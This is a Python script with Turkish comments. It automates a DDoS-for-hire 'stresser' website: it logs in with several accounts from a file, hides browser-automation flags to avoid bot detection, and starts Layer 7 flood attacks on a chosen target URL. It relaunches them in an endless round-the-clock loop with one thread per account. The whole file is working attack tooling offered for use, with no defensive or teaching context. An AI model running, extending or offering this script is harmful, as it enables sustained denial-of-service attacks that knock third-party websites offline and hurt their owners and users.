import threading
import time
import os
import sys
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

# Ortam değişkenlerinden veya accounts.txt'den okuma
ACCOUNTS_FILE = "accounts.txt"

def load_accounts():
    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"❌ {ACCOUNTS_FILE} bulunamadı!")
        sys.exit(1)
    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            if len(parts) >= 3:
                user, pwd, url = parts[0], parts[1], parts[2]
                method = parts[3] if len(parts) >= 4 else "browser-free"  # varsayılan
                accounts.append({
                    "id": str(idx),
                    "user": user,
                    "pass": pwd,
                    "url": url,
                    "method": method
                })
            else:
                print(f"⚠️ Geçersiz satır atlandı: {line}")
    return accounts

def attack_worker(account):
    acc_id = account["id"]
    username = account["user"]
    password = account["pass"]
    target_url = account["url"]
    method = account["method"]
    profile_dir = os.path.join(os.getcwd(), f"browser_profiles/profile_{username}")

    print(f"[{username}] 🚀 Başlatılıyor, hedef: {target_url}, method: {method}")

    while True:  # Kesintisiz çalışma (7/24)
        try:
            with sync_playwright() as p:
                context = p.chromium.launch_persistent_context(
                    user_data_dir=profile_dir,
                    headless=True,
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
                page = context.new_page()
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                """)

                # --- GİRİŞ ---
                print(f"[{username}] 🔐 Giriş yapılıyor...")
                page.goto("https://l7srv.cc/login", timeout=60000)
                page.wait_for_load_state("networkidle")
                time.sleep(2)
                page.fill("#username", username)
                page.fill("#password", password)
                page.click("button.btn-submit")
                try:
                    page.wait_for_url(lambda url: "/dash" in url, timeout=15000)
                except:
                    pass
                print(f"[{username}] ✅ Giriş başarılı.")

                # --- STRESS SAYFASI ---
                page.goto("https://l7srv.cc/dash/stress", timeout=60000)
                page.wait_for_load_state("networkidle")
                time.sleep(3)
                try:
                    page.locator("#layer_7").wait_for(state="visible", timeout=10000)
                    page.locator("#layer_7").click()
                except Exception as e:
                    print(f"[{username}] ❌ Layer 7 bulunamadı: {e}")
                    raise

                # --- ANA SALDIRI DÖNGÜSÜ ---
                while True:
                    try:
                        # URL gir
                        page.fill("#l7host", target_url, timeout=10000)
                        # Method seç
                        page.select_option("#l7method", value=method, timeout=5000)
                        # Süre (FREE1=120, FREE2=200)
                        time_value = 120 if method == "browser-free" else 200
                        page.fill("#l7time", str(time_value), timeout=5000)
                        # Başlat
                        page.click("#l7btn", timeout=5000)
                        print(f"[{username}] 🔥 Saldırı başlatıldı, süre {time_value} sn")

                        # Saldırı bitene kadar bekle (tablo kontrolü)
                        while True:
                            no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                            if no_attacks.count() > 0 and no_attacks.is_visible():
                                print(f"[{username}] ⏰ Saldırı sona erdi (tablo boş).")
                                break
                            expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                            if expire_cell.count() > 0:
                                expire_text = expire_cell.text_content().strip()
                                print(f"[{username}] ⏳ Kalan süre: {expire_text}")
                                if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                    print(f"[{username}] ⏰ Süre doldu veya expired.")
                                    break
                            time.sleep(2)

                        # Yeni saldırı için sayfayı yenile
                        print(f"[{username}] 🔄 Sayfa yenileniyor, yeni saldırı hazırlanıyor...")
                        page.reload()
                        page.wait_for_load_state("networkidle")
                        time.sleep(2)
                        page.locator("#layer_7").click()
                        time.sleep(1)

                    except (PlaywrightTimeout, Exception) as inner_e:
                        print(f"[{username}] ⚠️ Adım hatası: {inner_e} - sayfa yenileniyor")
                        page.reload()
                        page.wait_for_load_state("networkidle")
                        time.sleep(5)
                        continue

                # Döngüden çıkılmaz (sonsuz), ancak hata durumunda yeniden başlatılacak

        except Exception as outer_e:
            print(f"[{username}] 💥 KRİTİK HATA, 10 saniye sonra yeniden başlatılacak: {outer_e}")
            time.sleep(10)
            continue

if __name__ == "__main__":
    accounts = load_accounts()
    print(f"✅ {len(accounts)} hesap yüklendi.")
    threads = []
    for acc in accounts:
        t = threading.Thread(target=attack_worker, args=(acc,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(1)  # Tarayıcılar arası çakışmayı azaltmak için

    # Ana thread'i canlı tut
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("🛑 Kapatılıyor...")
        sys.exit(0)
